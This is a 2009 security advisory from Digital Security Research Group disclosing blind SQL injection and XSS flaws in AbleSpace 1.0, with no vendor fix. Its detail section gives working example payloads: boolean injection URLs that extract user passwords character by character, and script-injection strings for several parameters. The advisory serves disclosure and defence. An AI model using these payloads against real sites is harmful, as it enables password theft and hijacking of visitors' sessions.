@@ -1,0 +1,80 @@
+riginal advisory:  http://dsecrg.com/pages/vul/show.php?id=137
+
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-09-037
+
+Application:                    AbleSpace
+Versions Affected:              1.0
+Vendor URL:                     http://abk-soft.com/
+Bugs:                           Multiple Blind SQL Injections, Multiple XSS
+Exploits:                       YES
+Reported:                       18.03.2009
+Vendor Response:                NONE
+Secondly Reported:              29.03.2009
+Solution:                       NONE
+Date of Public Advisory:        14.04.2009
+Author:                         Eugene "Corwin" Ermakov
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+Details
+*******
+
+1. Multiple Blind Sql Injections
+
+1.1 Attacker can inject SQL code in events_view.php vulnerable parametr eid
+
+Example:
+http://[server]/[installdir]/events_view.php?eid=69'
+
+1.2 Attacker can inject SQL code in events_clndr_view.php vulnerable parametr id
+
+Example:
+http://[server]/[installdir]/events_clndr_view.php?id=1 and substring(@@version,1,1)=4
+http://[server]/[installdir]/events_clndr_view.php?id=1 and ascii(substring((select password from user where name='Mike'),1,1)) between 97 and 103
+http://[server]/[installdir]/events_clndr_view.php?id=1 and ascii(substring((select concat_ws(0x3a,name,password) from user where name='Mike'),1,1)) =77
+http://[server]/[installdir]/events_clndr_view.php?id=1 and ascii(substring((select concat_ws(0x3a,name,password) from user where user_id=1),1,1)) between 1 and 200
+
+
+2. Stored XSS
+
+2.1 Vulnerability found in script blogs_full.php
+
+Example:
+<IMG SRC=javascript:alert('XSS')>
+
+3. Multiple Linked XSS
+
+3.1 Linked XSS vulnerabiliies found in groups_profile.php. GET parameter "gid"
+
+Example:
+http://[server]/[installdir]/groups_profile.php?gid=311"><script>alert()</script>
+
+3.2 Linked XSS vulnerabiliies found in adv_cat.php. GET parameter "cat_id", "razd_id"
+
+Example:
+http://[server]/[installdir]/adv_cat.php?cat_id=4"><script>alert()</script>&razd_id=45"><script>alert()</script>
+
+
+
+Solution
+********
+
+We did not get any response from vendor for more than 2 weeks.
+
+No patches aviable.
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk
+analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards.
+Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted
+regularly on our website.
+
+
+Contact:    research [at] dsecrg [dot] com
+            http://www.dsecrg.com
+            http://www.dsec.ru
+
+# milw0rm.com [2009-04-14]
